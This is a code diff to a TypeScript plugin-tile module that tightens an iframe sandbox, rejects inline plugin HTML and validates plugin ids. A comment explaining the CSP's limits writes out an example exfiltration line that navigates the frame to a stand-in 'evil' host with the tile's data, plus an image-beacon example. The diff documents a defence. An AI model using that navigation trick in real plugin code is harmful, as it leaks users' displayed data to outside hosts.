@@ -89,6 +89,10 @@ export function handlePluginMessage(
     case "ready":
       return { kind: "ready" };
     case "resize": {
+      // Only coerce number / numeric-string heights. Coercing an arbitrary
+      // object can THROW (e.g. Number({toString: []}) → TypeError), which would
+      // violate the never-throws contract — so reject non-primitive heights.
+      if (typeof m.height !== "number" && typeof m.height !== "string") return null;
       const h = Number(m.height);
       if (!Number.isFinite(h)) return null;
       return {
@@ -127,24 +131,43 @@ export function handlePluginMessage(
  *   - script-src 'unsafe-inline' → the plugin's own inline JS may run (that's
  *                              the whole point) but NO external script URLs
  *   - style-src 'unsafe-inline'  → inline styles only, no remote stylesheets
- *   - img-src data:          → only inline data: images (no remote image beacon
- *                              exfiltration; blocks <img src="https://evil…">)
- *   - connect-src 'none'     → NO network egress at all: fetch, XHR, WebSocket,
- *                              EventSource, sendBeacon are all blocked
- * Nothing here grants navigation, form submission, or plugins/objects.
+ *   - img-src data:          → only inline data: images (blocks the classic
+ *                              <img src="https://evil…"> subresource beacon)
+ *   - connect-src 'none'     → blocks BACKGROUND subresource egress: fetch, XHR,
+ *                              WebSocket, EventSource, sendBeacon
+ *
+ * IMPORTANT — what this does NOT stop. The CSP fetch directives above govern
+ * SUBRESOURCE requests only. They do NOT govern navigation: a sandboxed frame
+ * can always navigate ITSELF (e.g. `location = "https://evil/?d=" + data`), and
+ * no CSP fetch directive covers that. So a plugin can still exfiltrate the data
+ * shown in ITS OWN tile. The sandbox (allow-scripts, no allow-same-origin) still
+ * fully isolates the Saiku origin — a plugin cannot read the parent DOM, cookies,
+ * the session token, or any other-origin data — but the tile's own rows are not
+ * confidential FROM the plugin. That is why plugins are ADMIN-INSTALLED trusted
+ * code (like a server plugin JAR): an admin who installs a plugin trusts it with
+ * the data that plugin's tile displays. Operators who want to close the
+ * self-navigation channel too can set a restrictive `frame-src` at the page/proxy
+ * layer via `saiku.security.csp`. See docs/APP-BUILDER-PLUGINS.md.
  */
 export const PLUGIN_CSP =
   "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'";
 
-/** Max length of the author plugin HTML we persist (anti-bloat, not security —
- *  the sandbox+CSP are what contain the code). Generous for a self-contained
- *  single-file widget. */
-export const PLUGIN_HTML_MAX_LEN = 200_000;
+/** The slug rule a plugin id must satisfy — MUST mirror the backend's
+ *  {@code TilePluginParser.SAFE_ID} ([a-z0-9] start, then [a-z0-9-], 1–64 chars).
+ *  A tile only ever references a plugin by this id; it never carries markup. */
+export const PLUGIN_ID_RE = /^[a-z0-9][a-z0-9-]{0,63}$/;
 
-/** Validate + normalise a plugin tile's opaque options blob. Shape only:
- *  `{ html: string }` (plus any author config passed through). The HTML is NOT
- *  sanitised — arbitrary JS is the feature and the iframe sandbox + CSP are the
- *  containment. Returns the registry's ValidateOptionsResult shape. */
+/**
+ * Validate + normalise a plugin tile's options blob. Shape only:
+ * `{ pluginId: string }` (plus any author config passed through untouched).
+ *
+ * SECURITY (saiku#1441): a plugin tile references an ADMIN-INSTALLED plugin by
+ * its slug id — it NEVER carries raw HTML. The markup is served only from the
+ * admin registry (`/rest/saiku/api/tile-plugins/{id}/html` in-app, or the
+ * token-scoped `/embed/app/{path}/plugin/{id}/html` on the embed surface). A
+ * legacy `html` field is rejected so no arbitrary author markup can ride tile
+ * config into a srcdoc.
+ */
 export function validatePluginOptions(
   options: unknown,
 ): { ok: true; value: Record<string, unknown> } | { ok: false; error: string } {
@@ -155,11 +178,18 @@ export function validatePluginOptions(
     return { ok: false, error: "Plugin options must be an object." };
   }
   const o = options as Record<string, unknown>;
-  if (o.html !== undefined && typeof o.html !== "string") {
-    return { ok: false, error: "Plugin `html` must be a string." };
+  // Refuse the old arbitrary-HTML channel outright (see saiku#1441): plugin HTML
+  // must come from the admin registry, never from tile config.
+  if (o.html !== undefined) {
+    return {
+      ok: false,
+      error: "Inline plugin `html` is no longer supported — reference an installed plugin by `pluginId`.",
+    };
   }
-  if (typeof o.html === "string" && o.html.length > PLUGIN_HTML_MAX_LEN) {
-    return { ok: false, error: `Plugin HTML exceeds ${PLUGIN_HTML_MAX_LEN} characters.` };
+  if (o.pluginId !== undefined) {
+    if (typeof o.pluginId !== "string" || !PLUGIN_ID_RE.test(o.pluginId)) {
+      return { ok: false, error: "Plugin `pluginId` must be a slug matching [a-z0-9-] (1–64 chars)." };
+    }
   }
   return { ok: true, value: { ...o } };
 }
